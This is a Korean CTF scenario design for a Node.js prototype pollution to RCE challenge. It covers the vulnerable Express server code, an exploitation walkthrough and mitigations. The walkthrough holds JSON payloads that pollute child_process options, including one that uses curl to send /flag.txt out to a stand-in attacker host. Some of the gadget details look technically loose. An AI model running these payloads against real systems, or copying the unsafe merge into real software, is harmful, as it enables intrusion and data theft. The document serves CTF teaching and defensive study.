---
title: Node.js Prototype Pollution leading to RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, prototype-pollution, nodejs, rce, javascript-security]
confidence: high
---

# Node.js Prototype Pollution leading to RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Custom Dashboard Engine (커스텀 대시보드 렌더러)
- **난이도**: High
- **핵심 컨셉**: 자바스크립트(Node.js) 개발 환경의 특유한 취약점인 **프로토타입 오염(Prototype Pollution)**을 RCE(원격 코드 실행)로 연계하는 심화형 문제입니다. 사용자는 자신의 관리 패널 위젯 배치 상태나 설정 메타데이터를 JSON 형태로 업로드해 자유롭게 저장하고 불러올 수 있습니다. 백엔드에서 사용자 설정 객체를 합치는(Merge) 취약한 동적 재귀 병합 헬퍼 함수가 구동되며, 공격자는 `__proto__` 혹은 `constructor.prototype` 속성을 주입해 자바스크립트의 전역 최상위 객체 속성을 오염시킵니다. 이후, 서버에서 구동되는 내부 모듈(예: 템플릿 컴파일러 또는 `child_process`)이 정의되지 않은 전역 속성을 상속받아 동작할 때 삽입된 쉘 명령어가 실행되도록 유도합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Customizer**: 사용자가 위젯의 크기, 테마, 타이틀 등을 변경하여 저장할 수 있는 GUI 인터페이스.
- **Backend Service (Node.js/Express)**:
  - 설정 저장 API `/api/config/save` 제공.
  - 전송받은 커스텀 JSON 설정을 기본 설정 객체와 재귀적으로 병합하는 `merge(target, source)` 취약 함수 동작.
  - 저장된 설정을 기반으로 정기 백업 스크립트나 내부 작업을 처리하기 위해 `child_process.fork` 혹은 `exec` 계열 메서드가 내부적으로 구동됨.
- **Flag 위치**:
  - 로컬 파일 시스템 내: `/flag.txt`

### 2.2 취약점 지점
1. **Unsafe Object Merge (Prototype Pollution)**:
   - 병합 함수 작성 시 `key === '__proto__'` 또는 `key === 'constructor'` 같은 자바스크립트 내장 특수 키에 대한 사전 제거(Sanitize)가 누락되어 있습니다.
   - 공격자가 전송한 JSON 내의 `{"__proto__": {"pollutedKey": "pollutedValue"}}` 구조가 병합되면서 `Object.prototype.pollutedKey`가 모든 객체 상속 트리에 주입됩니다.
2. **Polluted Execution Context (RCE Gadget)**:
   - Node.js 내장 `child_process` 모듈의 프로세스 실행 옵션 중 `env` 또는 `shell` 객체 속성이 정의되지 않은 상태에서 호출될 때, 오염된 글로벌 프로토타입으로부터 이 속성을 덮어씌워 받아 사용하게 됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 | 비고 |
|------------|--------|------|--------------------|---------|------|
| `/api/config/save`| POST | 없음 | `{"config": {...}}` | `{"status": "saved"}` | 프로토타입 오염 발생 지점 |
| `/api/config/backup`| POST| 없음 | 없음 | `{"status": "triggered"}`| 오염된 프로토타입이 프로세스를 실행하여 RCE를 일으키는 가젯 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 프로토타입 오염 확인
공격자는 JSON 설정 저장 기능을 이용해 임의 속성을 주입한 뒤, 서버가 정상적으로 오염되었는지 봅니다.
- *오염 테스트 요청*:
  ```http
  POST /api/config/save HTTP/1.1
  Host: dashboard.challenge.local
  Content-Type: application/json

  {
    "config": {
      "__proto__": {
        "isPolluted": "Yes! polluted"
      }
    }
  }
  ```
- 만약 에러 없이 저장이 잘 되었다면, 서버에서 동적으로 새로 만들어지는 빈 객체 `{}` 마저 `{}.isPolluted`에 접근 시 `"Yes! polluted"`를 리턴하게 됩니다.

### Step 2. RCE 연계 가젯 탐색
Node.js 환경의 대표적인 프로토타입 오염 가젯인 `child_process.spawn` 옵션 오염을 타겟으로 합니다.
`child_process`는 프로세스를 띄울 때 옵션 객체의 `shell` 필드가 비어있으면 쉘 기본값을 상속하지만, 오염에 의해 `Object.prototype.shell`이 설정되어 있다면 공격자가 주입한 실행 쉘 경로를 강제로 가져가서 사용합니다.
- **공격 페이로드 설계**:
  `shell`의 실행 경로에 `/bin/sh` 대신 실행할 악성 쉘 명령어를 포함하거나, `env` 객체 내의 `NODE_OPTIONS` 환경변수를 오염시키는 페이로드를 전달합니다.
  - *예시 (NODE_OPTIONS 오염)*:
    `NODE_OPTIONS` 변수에 `--require /app/something` 또는 `--experimental-modules` 기법을 오염시키는 법.
  - *예시 2 (shell 옵션 오염)*:
    ```json
    {
      "config": {
        "__proto__": {
          "shell": "/bin/sh",
          "argv0": "node; curl http://attacker.local/log?flag=$(cat /flag.txt | base64)"
        }
      }
    }
    ```
    또는 Node.js 버전별로 구동되는 `execArgv`나 `NODE_OPTIONS` 환경 변수 속성을 직접 덮어씁니다.
    ```json
    {
      "config": {
        "__proto__": {
          "env": {
            "EVIL": "console.log(require('child_process').execSync('cat /flag.txt').toString())"
          },
          "NODE_OPTIONS": "--require=/proc/self/environ"
        }
      }
    }
    ```

### Step 3. 오염 및 가젯 실행 트리거
1. 위의 공격용 JSON 페이로드를 `/api/config/save`에 POST 요청으로 전송해 서버 메모리를 오염시킵니다.
2. 이어서 백업 작업을 진행하는 `/api/config/backup`에 POST 요청을 날려 `child_process.fork()`가 호출되도록 유도합니다.

### Step 4. flag 획득
자식 프로세스 구동 시 오염된 환경 변수 및 쉘 지정 메커니즘이 합쳐지며 `/flag.txt` 내용을 읽는 시스템 명령어가 실행되고, 그 아웃풋 결과를 공격자 서버로 송출받아 플래그를 탈취하게 됩니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (Express & Prototype Pollution 취약 예시)
const express = require('express');
const { fork } = require('child_process');
const app = express();

app.use(express.json());

// 취약한 재귀 병합 함수
function merge(target, source) {
    for (let key in source) {
        if (source.hasOwnProperty(key)) {
            // 취약점 지점: "__proto__" 및 "constructor" 키 검증 부재
            if (target[key] instanceof Object && source[key] instanceof Object) {
                merge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
}

let userConfig = {};

app.post("/api/config/save", (req, res) => {
    const incomingConfig = req.body.config;
    
    if (!incomingConfig) {
        return res.status(400).json({ error: "Missing config" });
    }
    
    // 취약한 머지 작동 -> Object.prototype이 전역적으로 오염될 수 있음
    merge(userConfig, incomingConfig);
    return res.json({ status: "saved" });
});

app.post("/api/config/backup", (req, res) => {
    // 백업을 위해 자식 노드 프로세스를 동적으로 포크 실행
    // 취약점 지점: 두 번째 옵션 매개변수인 options(env, shell 등 포함)가 비어있음
    // 이로 인해 글로벌 prototype에 등록된 'env' 또는 'shell' 속성을 상속받아 프로세스를 띄움!
    try {
        const proc = fork("./backup.js", [], {
            // 여기서 env나 execArgv가 오염되어 있다면 주입된 세팅으로 구동됨
        });
        return res.json({ status: "triggered" });
    } catch (e) {
        return res.status(500).json({ error: e.message });
    }
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **안전한 복사 및 병합 라이브러리 사용**:
   - 직접 병합 코드를 작성하기보다 보안 패치가 적용된 안전한 라이브러리인 `lodash.merge` 최신 버전을 연동하거나, 병합 시 특수 프로퍼티(`__proto__`, `constructor`, `prototype`)를 사전에 완전 차단하는 필터를 적용합니다.
   - **코드 필터링 예시**:
     ```javascript
     if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
         continue; // 병합 연산에서 명시적 생략
     }
     ```
2. **프로토타입 상속이 없는 객체 생성**:
   - 중요한 설정이나 일회성 객체를 다룰 때 프로토타입 상속을 가지지 않는 빈 객체를 사용합니다: `Object.create(null)`
3. **자식 프로세스 실행 시 명시적 환경 설정**:
   - `spawn` 또는 `fork` 시 옵션 속성을 완전히 명시해주어 상속받은 글로벌 세팅이 프로세스 환경변수에 개입할 수 있는 가젯 여지를 차단합니다.
